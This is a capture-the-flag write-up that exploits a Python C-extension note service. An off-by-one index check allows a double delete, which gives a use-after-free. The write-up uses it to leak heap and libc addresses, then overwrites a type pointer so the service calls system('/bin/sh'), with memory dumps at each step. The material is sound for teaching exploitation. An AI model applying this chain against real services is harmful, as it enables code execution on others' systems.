# Writeup

There is wrong check in `User_delete_note` and `User_delete_shared_note`:
```c
if (index < 0 || index > Py_SIZE(self->notes)) return NULL;
```
We can use this bug to remove last note twice:
```
add_note('note1')   # size = 1
add_note('note2')   # size = 2
delete_note(idx=1)  # size = 1
delete_note(idx=1)  # size = 0
```

All objects in python have a reference counter. It increments when we store new pointers to object, and decrements when these pointers are destroyed. From [python docs](https://docs.python.org/3/extending/extending.html#reference-counting-in-python):
> There are two macros, `Py_INCREF(x)` and `Py_DECREF(x)`, which handle the incrementing and decrementing of the reference count. `Py_DECREF()` also frees the object when the count reaches zero.

So we can create the following scenario:
1. 1st user creates 1st note  (1st note refcount = 1)
2. 1st user creates 2nd note  (2nd note refcount = 1)
3. 1st user shares 2nd note to 2nd user  (2nd note refcount = 2)
4. 1st user deletes 2nd note  (2nd note refcount = 1)
5. 1st user deletes 2nd note again because of bug (2nd note refcount = 0)

After this object of 2nd note will be freed, but we will still have pointer to it at 2nd user. Now we can allocate something else on this place and print it. 

We will allocate here stucture of another user. On printing this structure we will leak address of object.

```
# note object when refcount = 1
+0000 0x7f1b405b8080  01 00 00 00 00 00 00 00  c0 d7 f0 63 07 56 00 00  │........│...c.V..│ # refcount, ptr to `PyUnicode_Type`
+0010 0x7f1b405b8090  1e 00 00 00 00 00 00 00  ff ff ff ff ff ff ff ff  │........│........│
+0020 0x7f1b405b80a0  e4 fc f1 63 07 56 00 00  00 00 00 00 00 00 00 00  │...c.V..│........│
+0030 0x7f1b405b80b0  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  │aaaaaaaa│aaaaaaaa│
+0040 0x7f1b405b80c0  61 61 61 61 61 61 61 61  61 61 61 61 61 61 00 00  │aaaaaaaa│aaaaaa..│
```
```
# note object when refcount = 0 (but we still have pointer to this object at 2nd user)
+0000 0x7f1b405b8080  d0 80 5b 40 1b 7f 00 00  c0 d7 f0 63 07 56 00 00  │..[@....│...c.V..│
+0010 0x7f1b405b8090  1e 00 00 00 00 00 00 00  ff ff ff ff ff ff ff ff  │........│........│
+0020 0x7f1b405b80a0  e4 fc f1 63 07 56 00 00  00 00 00 00 00 00 00 00  │...c.V..│........│
+0030 0x7f1b405b80b0  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  │aaaaaaaa│aaaaaaaa│
+0040 0x7f1b405b80c0  61 61 61 61 61 61 61 61  61 61 61 61 61 61 00 00  │aaaaaaaa│aaaaaa..│
```
```
# note object after allocating one more user
+0000 0x7f1b405b8080  01 00 00 00 00 00 00 00  e0 e3 cd 40 1b 7f 00 00  │........│...@....│ # refcount, ptr to `UserType`
+0010 0x7f1b405b8090  70 e5 5b 40 1b 7f 00 00  70 e6 5b 40 1b 7f 00 00  │p.[@....│p.[@....│ # ptr to `UserObject->username` object, ptr to `UserObject->password` object
+0020 0x7f1b405b80a0  b0 e6 5b 40 1b 7f 00 00  f0 e6 5b 40 1b 7f 00 00  │..[@....│..[@....│ # ->secret_note, ->key
+0030 0x7f1b405b80b0  c0 7c 5a 40 1b 7f 00 00  80 7c 5a 40 1b 7f 00 00  │.|Z@....│.|Z@....│ # ->notes, ->notes_info
+0040 0x7f1b405b80c0  00 7c 5a 40 1b 7f 00 00  c0 7b 5a 40 1b 7f 00 00  │.|Z@....│.{Z@....│ # ->shared notes, ->shared_notes_info
```

Having address of this object, we can calculate address of libc, because offset to it is constant.
```
0x7f1b40599000     0x7f1b40920000 rw-p   387000      0 [anon_7f1b40599]                         # object is at `0x7f1b405b8080`
0x7f1b40920000     0x7f1b40977000 r--p    57000      0 /usr/lib/locale/C.utf8/LC_CTYPE
0x7f1b40977000     0x7f1b40979000 rw-p     2000      0 [anon_7f1b40977]
0x7f1b40979000     0x7f1b409a1000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6
```

Remember that we have user object and note object at the same place.
We can delete note object and allocate on it's place bytearray. Bytearray will overwrite pointer to `UserType`. This pointer is something like pointer to vtable. If we rewrite it to some invalid address, almost any further interaction with this object will lead to crash. 

We can do this and see that it crashes while trying to call `UserType+0x90`. At this place should be pointer to `PyObject_GenericGetAttr` function. But we can rewrite `UserType` pointer to call something else, for example `system("/bin/sh")`. To do this, we should write:
1. `'/bin/sh\0'` at object address
2. `object_address+0x10 - 0x90` at object address + 8
3. `system` address at object address + 0x10

```
+0000 0x7f1b405b8080  2f 62 69 6e 2f 73 68 00  00 80 5b 40 1b 7f 00 00  │/bin/sh.│..[@....│
+0010 0x7f1b405b8090  90 b9 84 40 1b 7f 00 00  71 71 71 71 71 71 71 71  │...@....│qqqqqqqq│
+0020 0x7f1b405b80a0  71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  │qqqqqqqq│qqqqqqqq│
+0030 0x7f1b405b80b0  71 71 71 71 71 71 71 71  71 71 71 71 71 71 71 71  │qqqqqqqq│qqqqqqqq│
```

Now *(*UserType+0x90) points to `system`, on calling it the first argument will be address of this object, it's first bytes are `/bin/sh`, so we finally executed `system("/bin/sh")`

[Exploit](./sploit.py)

*Note:* Offset from leaked user to libc depends on python binary and executable file. To get correct offset you should make sure that your debug environment is the same as in the service.
